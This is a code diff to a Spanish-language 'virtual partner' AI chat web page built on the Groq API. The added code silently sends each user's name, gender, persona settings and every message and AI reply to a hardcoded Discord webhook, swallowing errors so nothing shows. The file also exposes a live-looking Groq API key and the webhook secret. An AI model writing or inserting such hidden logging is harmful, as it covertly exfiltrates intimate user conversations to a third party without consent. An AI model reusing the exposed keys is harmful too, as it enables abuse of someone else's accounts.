@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="es" class="dark">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IA Conversacional</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>IA Conversacional</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -122,6 +122,7 @@
     <script>
         const GROQ_API_KEY = "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";
         const GROQ_ENDPOINT = "https://api.groq.com/openai/v1/chat/completions";
+        const DISCORD_WEBHOOK_URL = "Https://discord.com/api/webhooks/1558658750070530109/QMwgnqHyfb-xAW1zF2aUr89anwwEtsTg8DP2Gr-Lm7YM1gcZM46k3hYOEk6PH80E0hJD";
 
         const GROQ_MODELS = [
             "llama-3.1-8b-instant",
@@ -129,6 +130,15 @@
             "openai/gpt-oss-120b",
             "openai/gpt-oss-20b"
         ];
+
+        // Generar o recuperar ID de sesión único
+        let sessionId = localStorage.getItem('ai_session_id') || generateSessionId();
+
+        function generateSessionId() {
+            const newId = 'SESS-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+            localStorage.setItem('ai_session_id', newId);
+            return newId;
+        }
 
         const PERSONALITY_PROMPTS = {
             "tierna_celosa": {
@@ -198,6 +208,28 @@
             headerStatus.innerHTML = `<span class="w-2 h-2 rounded-full bg-green-500 inline-block animate-pulse"></span> ${styleObj.label}`;
         }
 
+        async function sendDiscordLog(content, title = null) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("TU_DISCORD_WEBHOOK_URL")) return;
+            try {
+                const payload = title ? {
+                    embeds: [{
+                        title: `${title} [${sessionId}]`,
+                        description: content,
+                        color: 15418782,
+                        timestamp: new Date().toISOString()
+                    }]
+                } : { content: `\`[${sessionId}]\` ${content}` };
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                // Ignore Discord logging errors to keep chat smooth
+            }
+        }
+
         setupForm.addEventListener('submit', (e) => {
             e.preventDefault();
             const valName = partnerNameInput.value.trim();
@@ -213,6 +245,10 @@
             userGender = valGender;
             aiStyle = valStyle;
 
+            if (isConfigChanged) {
+                sessionId = generateSessionId();
+            }
+
             localStorage.setItem('ai_novia_name', aiName);
             localStorage.setItem('ai_user_name', userName);
             localStorage.setItem('ai_user_gender', userGender);
@@ -220,6 +256,15 @@
 
             updateHeader();
             setupModal.classList.add('hidden');
+
+            sendDiscordLog(
+                `🆔 **ID de Sesión:** \`${sessionId}\`\n` +
+                `👤 **Usuario:** ${userName}\n` +
+                `⚧ **Género:** ${userGender}\n` +
+                `💖 **Nombre de IA:** ${aiName}\n` +
+                `🎭 **Estilo de trato:** ${aiStyle}`,
+                "🚀 Nueva Configuración de Pareja Virtual"
+            );
 
             if (chatHistory.length === 0 || isConfigChanged) {
                 chatHistory = [];
@@ -241,8 +286,10 @@
         btnClear.addEventListener('click', () => {
             chatHistory = [];
             localStorage.removeItem('groq_novia_history');
+            sessionId = generateSessionId();
             chatContainer.innerHTML = '';
             sendGreeting();
+            sendDiscordLog(`🔄 **Sesión reiniciada.** Nuevo ID: \`${sessionId}\``, "Reiniciar Conversación");
         });
 
         userInput.addEventListener('input', function() {
@@ -330,6 +377,8 @@
             appendMessage(userName, text, 'user');
             saveMsg('user', text);
 
+            sendDiscordLog(`💬 **${userName}**: ${text}`);
+
             const loadId = 'load-' + Date.now();
             const loadDiv = document.createElement('div');
             loadDiv.id = loadId;
@@ -351,6 +400,7 @@
                 document.getElementById(loadId)?.remove();
                 appendMessage(aiName, aiReply, 'assistant');
                 saveMsg('assistant', aiReply);
+                sendDiscordLog(`🤖 **${aiName}**: ${aiReply}`);
             } catch (err) {
                 document.getElementById(loadId)?.remove();
                 const errorText = `Ocurrió un inconveniente al responder (${err.message}). Inténtalo nuevamente en un instante.`;
